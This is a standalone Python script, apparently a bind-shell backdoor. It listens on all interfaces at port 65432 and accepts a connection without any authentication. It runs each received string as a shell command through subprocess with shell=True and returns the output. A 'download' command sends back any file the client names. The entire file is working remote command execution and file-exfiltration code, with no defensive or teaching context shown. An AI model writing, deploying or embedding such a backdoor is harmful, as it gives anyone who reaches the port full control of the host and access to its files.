import socket
import subprocess
import os

HOST = '0.0.0.0'
PORT = 65432

def send_file(conn, file_path):
    try:
        with open(file_path, 'rb') as f:
            while chunk := f.read(4096):
                conn.sendall(chunk)
        conn.sendall(b'FILE_TRANSFER_COMPLETE')
    except FileNotFoundError:
        conn.sendall(b'File not found.')

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    print('Server is listening...')
    conn, addr = s.accept()
    with conn:
        print('Connected by', addr)
        conn.sendall(b'Connection successful')
        while True:
            data = conn.recv(1024)
            if not data:
                break
            command = data.decode()
            if command.lower() == 'exit':
                print("Connection closed by the client.")
                break
            elif command.startswith('download '):
                file_path = command.split(' ', 1)[1]
                send_file(conn, file_path)
            else:
                result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, stderr = result.communicate()
                output = stdout + stderr
                if not output:
                    output = b'Command executed but produced no output.'
                conn.sendall(output)
